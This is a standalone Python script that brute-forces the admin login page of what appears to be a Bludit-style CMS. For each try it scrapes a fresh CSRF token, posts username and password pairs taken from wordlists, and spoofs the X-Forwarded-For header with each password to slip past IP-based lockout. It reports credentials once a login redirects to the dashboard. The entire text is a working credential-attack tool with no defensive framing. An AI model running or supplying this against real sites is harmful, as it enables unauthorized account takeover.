import re, requests



def open_source(file_path):
    return [item.replace("\n","") for item in open(file_path).readlines()]
        

host = 'http://ip/'
login_url = host + 'admin/login'
passlist = open_source('/opt/list.txt')
userlist = open_source('/opt/user.txt')

for username in userlist:
    for password in passlist:
        session = requests.Session()
        login_page = session.get(login_url)
        csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
        print('[+]Trying: {u}:{p}'.format(u = username, p = password))

        headers = {
            'X-Forwarded-For': password,
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
                'Referer': login_url
        }

        data = {
            'tokenCSRF': csrf_token,
            'username': username,
            'password': password,
            'save': ''
        }

        login_result = requests.post(login_url, headers = headers, data = data, allow_redirects = False)

        if 'location' in login_result.headers:
            if '/admin/dashboard' in login_result.headers['location']:
                print('SUCCESS : PASS FOUND')
                print('USE {u}:{p}'.format(u = username, p = password))
                break
else:
    print('password NOT found')